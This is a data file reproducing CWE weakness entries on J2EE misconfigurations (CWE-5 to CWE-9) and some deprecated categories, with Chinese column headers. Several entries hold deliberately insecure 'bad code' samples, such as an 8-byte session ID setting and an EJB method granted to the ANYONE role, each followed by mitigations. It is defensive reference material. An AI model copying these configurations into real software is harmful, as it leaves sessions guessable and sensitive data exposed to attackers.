cwe_vulnerabilities
名称,定义,常见后果,示范例子,可能的缓解方案
CWE CATEGORY: DEPRECATED: Location,"This category has been deprecated. It was originally used for organizing the Development View (CWE-699), but it introduced unnecessary complexity and depth to the resulting tree.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: 7PK - Environment,"This category represents one of the phyla in the Seven Pernicious Kingdoms vulnerability classification. It includes weaknesses that are typically introduced during unexpected environmental conditions. According to the authors of the Seven Pernicious Kingdoms, ""This section includes everything that is outside of the source code but is still critical to the security of the product that is being created. Because the issues covered by this kingdom are not directly related to source code, we separated it from the rest of the kingdoms.""",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: DEPRECATED: Technology-specific Environment Issues,"This category has been deprecated. It was originally intended as a ""catch-all"" for environment issues for technologies that did not have their own CWE, but it introduced unnecessary depth and complexity to the Development View (CWE-699).",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: DEPRECATED: J2EE Environment Issues,"This entry has been deprecated. It was originally used for organizing the Development View (CWE-699) and some other views, but it introduced unnecessary complexity and depth to the resulting tree.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-5: J2EE Misconfiguration: Data Transmission Without Encryption,Information sent over a network can be compromised while in transit. An attacker may be able to read or modify the contents if the data are sent in plaintext or are weakly encrypted.,"Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify Application Data, Likelihood: ",无示范例子,Phase:  System ConfigurationThe product configuration should ensure that SSL or an encryption mechanism of equivalent strength and vetted reputation is used for all access-controlled pages.
CWE-6: J2EE Misconfiguration: Insufficient Session-ID Length,The J2EE application is configured to use an insufficient session ID length.,"Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityIf an attacker can guess an authenticated user's session identifier, they can take over the user's session., Likelihood: ","Example 1The following XML example code is a deployment descriptor for a Java web application deployed on a Sun Java Application Server. This deployment descriptor includes a session configuration property for configuring the session ID length.(bad code)Example Language:XML<sun-web-app>...<session-config><session-properties><property name=""idLengthBytes"" value=""8""><description>The number of bytes in this web module's session ID.</description></property></session-properties></session-config>...</sun-web-app>This deployment descriptor has set the session ID length for this Java web application to 8 bytes (or 64 bits). The session ID length for Java web applications should be set to 16 bytes (128 bits) to prevent attackers from guessing and/or stealing a session ID and taking over a user's session.Note for most application servers including the Sun Java Application Server the session ID length is by default set to 128 bits and should not be changed. And for many application servers the session ID length cannot be changed from this default setting. Check your application server documentation for the session ID length default setting and configuration options to ensure that the session ID length is set to 128 bits.","Phase:  ImplementationSession identifiers should be at least 128 bits long to prevent brute-force session guessing. A shorter session identifier leaves the application open to brute-force session guessing attacks.Phase:  ImplementationA lower bound on the number of valid session identifiers that are available to be guessed is the number of users that are active on a site at any given moment. However, any users that abandon their sessions without logging out will increase this number. (This is one of many good reasons to have a short inactive session timeout.) With a 64 bit session identifier, assume 32 bits of entropy. For a large web site, assume that the attacker can try 1,000 guesses per second and that there are 10,000 valid session identifiers at any given moment. Given these assumptions, the expected time for an attacker to successfully guess a valid session identifier is less than 4 minutes. Now assume a 128 bit session identifier that provides 64 bits of entropy. With a very large web site, an attacker might try 10,000 guesses per second with 100,000 valid session identifiers available to be guessed. Given these assumptions, the expected time for an attacker to successfully guess a valid session identifier is greater than 292 years."
CWE-7: J2EE Misconfiguration: Missing Custom Error Page,The default error page of a web application should not display sensitive information about the product.,"Scope: Confidentiality, Impact: Technical Impact:Read Application DataA stack trace might show the attacker a malformed SQL query string, the type of database being used, and the version of the application container. This information enables the attacker to target known vulnerabilities in these components., Likelihood: ","Example 1In the snippet below, an unchecked runtime exception thrown from within the try block may cause the container to display its default error page (which may contain a full stack trace, among other things).(bad code)Example Language:JavaPublic void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {try {...} catch (ApplicationSpecificException ase) {logger.error(""Caught: "" + ase.toString());}}","Phase:  ImplementationHandle exceptions appropriately in source code.Phases:  Implementation; System ConfigurationAlways define appropriate error pages. The application configuration should specify a default error page in order to guarantee that the application will never leak error messages to an attacker. Handling standard HTTP error codes is useful and user-friendly in addition to being a good security practice, and a good configuration will also define a last-chance error handler that catches any exception that could possibly be thrown by the application.Phase:  ImplementationDo not attempt to process an error or attempt to mask it.Phase:  ImplementationVerify return values are correct and do not supply sensitive information about the system."
CWE-8: J2EE Misconfiguration: Entity Bean Declared Remote,"When an application exposes a remote interface for an entity bean, it might also expose methods that get or set the bean's data. These methods could be leveraged to read sensitive information, or to change data in ways that violate the application's expectations, potentially leading to other vulnerabilities.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Application Data; Modify Application Data, Likelihood: ",Example 1The following example demonstrates the weakness.(bad code)Example Language:XML<ejb-jar><enterprise-beans><entity><ejb-name>EmployeeRecord</ejb-name><home>com.wombat.empl.EmployeeRecordHome</home><remote>com.wombat.empl.EmployeeRecord</remote>...</entity>...</enterprise-beans></ejb-jar>,"Phase:  ImplementationDeclare Java beans ""local"" when possible. When a bean must be remotely accessible, make sure that sensitive information is not exposed, and ensure that the application logic performs appropriate validation of any data that might be modified by an attacker."
CWE-9: J2EE Misconfiguration: Weak Access Permissions for EJB Methods,"If elevated access rights are assigned to EJB methods, then an attacker can take advantage of the permissions to exploit the product.","Scope: Other, Impact: Technical Impact:Other, Likelihood: ",Example 1The following deployment descriptor grants ANYONE permission to invoke the Employee EJB's method named getSalary().(bad code)Example Language:XML<ejb-jar>...<assembly-descriptor><method-permission><role-name>ANYONE</role-name><method><ejb-name>Employee</ejb-name><method-name>getSalary</method-name></method-permission></assembly-descriptor>...</ejb-jar>,Phases:  Architecture and Design; System ConfigurationFollow the principle of least privilege when assigning access rights to EJB methods. Permission to invoke EJB methods should not be granted to the ANYONE role.
CWE CATEGORY: DEPRECATED: ASP.NET Environment Issues,This category has been deprecated. It added unnecessary depth and complexity to its associated views.,无常见后果信息,无示范例子,无可能的缓解方案
